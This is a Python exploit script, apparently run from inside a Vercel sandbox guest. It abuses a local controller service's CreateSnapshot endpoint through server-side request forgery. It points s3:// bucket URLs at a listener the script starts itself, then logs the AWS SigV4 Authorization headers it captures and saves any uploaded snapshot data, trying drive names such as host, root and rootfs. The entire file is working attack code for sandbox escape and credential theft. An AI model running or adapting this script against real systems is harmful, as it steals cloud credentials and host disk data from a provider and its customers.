# -*- coding: utf-8 -*-
"""v193 payload (guest): sandboxctrl 23456 CreateSnapshot s3:// SSRF + 凭据提取
1. 监听 0.0.0.0:18081 (宿主 netns) 记录 S3 请求 + SigV4 Authorization
2. 23456 ControllerService/CreateSnapshot bucketBaseUrl=s3://127.0.0.1:18081/ 变体
   driveId: sandbox/vda/host/root/rootfs + snapshotId 组合
输出 /vercel/sandbox/v193c.out"""
import socket, time, json, os, signal, threading

OUT = '/vercel/sandbox/v193c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

RECV = []
LOCK = threading.Lock()


def log(s, maxlen=2000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def post(ip, port, path, body, t=12):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 6000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ============ 1: S3 监听器 (宿主 netns) ============
log('=== 1 listener ===')
def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', 18081))
        srv.listen(20)
        srv.settimeout(1)
        log('LISTENER UP')
        end = time.time() + 130
        while time.time() < end:
            try:
                c, a = srv.accept()
            except socket.timeout:
                continue
            c.settimeout(4)
            try:
                d = b''
                while True:
                    x = c.recv(65536)
                    if not x:
                        break
                    d += x
                    if len(d) > 2000000:
                        break
            except Exception:
                pass
            try:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}')
            except Exception:
                pass
            c.close()
            with LOCK:
                RECV.append((a, d))
                log('RECV from %s %d bytes' % (a, len(d)))
                for line in d.split(b'\r\n'):
                    if line[:16].lower() == b'authorization: ':
                        log('AUTH: %r' % line[:700])
                    if line[:12].lower() == b'x-amz-date' or line[:8].lower() == b'amz-sdk':
                        log('HDR: %r' % line[:300])
        srv.close()
    except Exception as e:
        log('LISTENER EXC %s' % e)


t = threading.Thread(target=listener, daemon=True)
t.start()
time.sleep(1)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

# ============ 2: 23456 CreateSnapshot s3:// 变体 ============
log('=== 2 ctrl s3 snapshots ===')
for did, tag, extra in [
    ('sandbox', 'c1', {}),
    ('sandbox', 'c1b', {'snapshotId': 's1'}),
    ('vda', 'c2', {}),
    ('host', 'c3', {}),
    ('root', 'c4', {}),
    ('rootfs', 'c5', {}),
]:
    body = {'driveId': did, 'bucketBaseUrl': 's3://127.0.0.1:18081/snap/%s' % tag}
    body.update(extra)
    st, pay = post('127.0.0.1', 23456, '/' + CTRL + '/CreateSnapshot', body, t=12)
    log('CTRL S3 %s %s -> %s %r' % (did, tag, st, pay[:500]))
    time.sleep(3)

# ============ 3: 汇总 ============
log('=== 3 summary ===')
time.sleep(8)
with LOCK:
    log('TOTAL RECV %d' % len(RECV))
    for i, (a, d) in enumerate(RECV):
        log('R%d %s %d bytes: %r' % (i, a, len(d), d[:400]))
        try:
            hb = d.split(b'\r\n\r\n', 1)
            if len(hb) > 1 and len(hb[1]) > 100:
                fn = '/vercel/sandbox/v193up%d.bin' % i
                open(fn, 'wb').write(hb[1])
                log('SAVED %s %d bytes' % (fn, len(hb[1])))
        except Exception as e:
            log('SAVE EXC %s' % e)

log('V193_DONE')
f.close()
